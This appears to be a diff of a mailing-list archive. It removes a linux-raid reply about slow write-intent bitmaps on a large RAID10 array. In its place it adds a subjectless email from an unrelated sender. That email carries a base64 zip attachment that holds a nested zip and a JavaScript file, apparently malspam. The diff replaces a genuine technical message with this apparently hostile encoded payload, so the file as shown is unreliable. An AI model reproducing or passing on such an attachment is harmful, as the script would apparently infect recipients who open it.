@@ -1,140 +1,97 @@
-From: NeilBrown <neilb@suse.com>
-Subject: Re: internal write-intent bitmap is horribly slow with RAID10 over 20 drives
-Date: Wed, 07 Jun 2017 08:02:59 +1000
-Message-ID: <87fufcdbak.fsf@notabene.neil.brown.name>
-References: <CAGqmV7qRh+_BXAr-qf6vUkiZyzi69E8CiX_vA92tZV2LfDxq_A@mail.gmail.com> <87tw3tdbs1.fsf@notabene.neil.brown.name> <CAGqmV7qVq8nBmop5h7OZKr9ZjCjGLcoPqMF5xa4d2iHzf2uQdw@mail.gmail.com>
+From: <mdavis@cc76.k12.il.us>
+Subject: (unknown)
+Date: Tue, 06 Jun 2017 23:46:12 -0000
+Message-ID: <149679277215.19456.1714355295380422792@iol.cz>
 Mime-Version: 1.0
-Content-Type: multipart/signed; boundary="=-=-=";
-        micalg=pgp-sha256; protocol="application/pgp-signature"
+Content-Type: application/zip; name="37913653393087.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-raid-owner@vger.kernel.org>
-In-Reply-To: <CAGqmV7qVq8nBmop5h7OZKr9ZjCjGLcoPqMF5xa4d2iHzf2uQdw@mail.gmail.com>
+Content-Disposition: attachment
+Subject: 
 Sender: linux-raid-owner@vger.kernel.org
-To: CoolCold <coolthecold@gmail.com>
-Cc: Linux RAID <linux-raid@vger.kernel.org>
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
---=-=-=
-Content-Type: text/plain
-Content-Transfer-Encoding: quoted-printable
-
-On Tue, Jun 06 2017, CoolCold wrote:
-
-> Hello!
-> Neil, thanks for reply, further inline
->
-> On Tue, Jun 6, 2017 at 10:40 AM, NeilBrown <neilb@suse.com> wrote:
->> On Mon, Jun 05 2017, CoolCold wrote:
->>
->>> Hello!
->>> Keep testing the new box and while having not the best sync speed,
->>> it's not the worst thing I found.
->>>
->>> Doing FIO testing, for RAID10 over 20 10k RPM drives, I have very bad
->>> performance, like _45_ iops only.
->>
->> ...
->>>
->>>
->>> Output from fio with internal write-intent bitmap:
->>> Jobs: 1 (f=3D1): [w(1)] [28.3% done] [0KB/183KB/0KB /s] [0/45/0 iops]
->>> [eta 07m:11s]
->>>
->>> array definition:
->>> [root@spare-a17484327407661 rovchinnikov]# cat /proc/mdstat
->>> Personalities : [raid1] [raid10] [raid6] [raid5] [raid4]
->>> md1 : active raid10 sdx[19] sdw[18] sdv[17] sdu[16] sdt[15] sds[14]
->>> sdr[13] sdq[12] sdp[11] sdo[10] sdn[9] sdm[8] sdl[7] sdk[6] sdj[5]
->>> sdi[4] sdh[3] sdg[2] sdf[1] sde[0]
->>>       17580330880 blocks super 1.2 64K chunks 2 near-copies [20/20]
->>> [UUUUUUUUUUUUUUUUUUUU]
->>>       bitmap: 0/66 pages [0KB], 131072KB chunk
->>>
->>> Setting journal to be
->>> 1) on SSD (separate drives), shows
->>> Jobs: 1 (f=3D1): [w(1)] [5.0% done] [0KB/18783KB/0KB /s] [0/4695/0 iops]
->>> [eta 09m:31s]
->>> 2) to 'none' (disabling) shows
->>> Jobs: 1 (f=3D1): [w(1)] [14.0% done] [0KB/18504KB/0KB /s] [0/4626/0
->>> iops] [eta 08m:36s]
->>
->> These numbers suggest that the write intent bitmap causes a 100-fold slow
->> down.
->> i.e. 45 iops instead of 4500 iops (roughly).
->>
->> That is certainly more than I would expect, so maybe there is a bug.
-> I suppose noone is using raid10 over more than 4 drives then, i can't
-> believe i'm the one who hit this problem.
-
-We have customers who use RAID10 will many more than 4 drives, but I
-haven't had reports like this.  Presumably whatever problem is affecting
-you is not affecting them.  We cannot know until we drill down to
-understand the problem.
-
->
->>
->> Large RAID10 is a worst-base for bitmap updates as the bitmap is written
->> to all devices instead of just those devices that contain the data which
->> the bit corresponds to.  So every bitmap update goes to 10 device.
->>
->> Your bitmap chunk size of 128M is nice and large, but making it larger
->> might help - maybe 1GB.
-> Tried that already, wasn't any much difference, but will gather more stat=
-istics.
->
->>
->> Still 100-fold ... that's a lot..
->>
->> A potentially useful exercise would be to run a series of tests,
->> changing the number of devices in the array from 2 to 10, changing the
->> RAID chunk size from 64K to 64M, and changing the bitmap chunk size from
->> 64M to 4G.
-> Changing chunk size to up to 64M just to gather statistics or you
-> suppose it may be some practical usage for this?
-
-I don't have any particular reason to expect this to have an effect.
-But it is easy to change, and changing it might show provide some hints.
-So probably "just to gather statistics".
-
-NeilBrown
-
-
->> In each configuration, run the same test and record the iops.
->> (You don't need to wait for a resync each time, just use
->> --assume-clean).
-> This helps, thanks
->> Then graph all this data (or just provide the table and I'll graph it).
->> That might provide an insight into where to start looking for the
->> slowdown.
->>
->> NeilBrown
->
->
->
-> --=20
-> Best regards,
-> [COOLCOLD-RIPN]
-> --
-> To unsubscribe from this list: send the line "unsubscribe linux-raid" in
-> the body of a message to majordomo@vger.kernel.org
-> More majordomo info at  http://vger.kernel.org/majordomo-info.html
-
---=-=-=
-Content-Type: application/pgp-signature; name="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAEBCAAdFiEEG8Yp69OQ2HB7X0l6Oeye3VZigbkFAlk3JpQACgkQOeye3VZi
-gblk7A/9Hc1NHoSn0k3He+MQdvZ0psfAeLJo9aplfy6NBMLoedvXIORuazI4AkEE
-S6vw96WI+Brqgc+cePcIgJAKVCyM8CVfhFOoRlc2orrRa9HLIDuLCfR9lvByg9Gm
-hoygc1UG+J3Pb/5MfG/OD0gKP8bJF6OztwzMSYHTSMBXL9hHBNA/V9LUWhDtrjUn
-0LMuywddkmcCnn20FuV799DlMXgVpbs9f4Y6ySeLH1tCRAqZqIdheuN08WfXlna9
-JB3L3YrrbFCjrpNb4o5v4y96XetaGc2e5SbRh2sYRMmp8GBMUSmh7ouwuSFuIOCr
-vO3s4PnGvxpp1ZDYuTe3QUWpqpSsDQ+LRGJmNnKZazHHJ4qq3h3SPMqkVPfHU7dD
-Xkzx3l3UFQw30l8l1yr5pi0SZkPChGBvUe77PDSrDT8N76UBN0PGVtuCENS2KMRs
-jxCzD+eQZBh0kkvCJy3KQZV6Jr724Nox1uAnDsI5MSOkxrxYl094HWXrH2CIf7Mu
-D40mmf0f6F4r8Iz8wV3qI42i9afF54XmEdq1wHIF7ZwpTSRzSxFjheV7yXZSXeB1
-9oq/nqxFbutbuPNd1CVyqOqsknczQTDfvv+vkDC74CRqVJfbMVOEQqGlIQhKD73m
-mVtVw5oEnK4dW9cNzU8RE5F3UAOHKuYBa9QV2SboBt4OoJlnWyI=
-=voH5
------END PGP SIGNATURE-----
---=-=-=--
+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
